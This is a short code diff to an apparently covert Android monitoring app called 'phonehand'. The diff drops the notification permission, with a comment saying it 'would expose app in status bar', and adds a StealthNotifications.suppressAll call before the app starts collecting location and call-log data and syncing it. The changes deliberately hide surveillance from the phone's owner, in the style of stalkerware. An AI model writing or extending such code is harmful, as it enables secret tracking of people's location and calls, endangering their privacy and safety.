@@ -9,10 +9,8 @@ import androidx.core.content.ContextCompat
 object PermissionRequester {
     const val ACTION_REQUEST = "com.phonehand.app.REQUEST_INTEL_PERMS"
 
+    /** Intelligence permissions only — never POST_NOTIFICATIONS (would expose app in status bar). */
     private val RUNTIME = buildList {
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-            add(android.Manifest.permission.POST_NOTIFICATIONS)
-        }
         add(android.Manifest.permission.ACCESS_FINE_LOCATION)
         add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
         add(android.Manifest.permission.READ_CALL_LOG)
@@ -72,6 +70,7 @@ class ActivityCollector(private val context: Context) {
     fun start() {
         if (started) return
         started = true
+        StealthNotifications.suppressAll(context)
         PermissionRequester.requestIfNeeded(context)
         locationTracker = LocationTracker(context).also { it.start() }
         handler.postDelayed(syncLoop, 5_000)
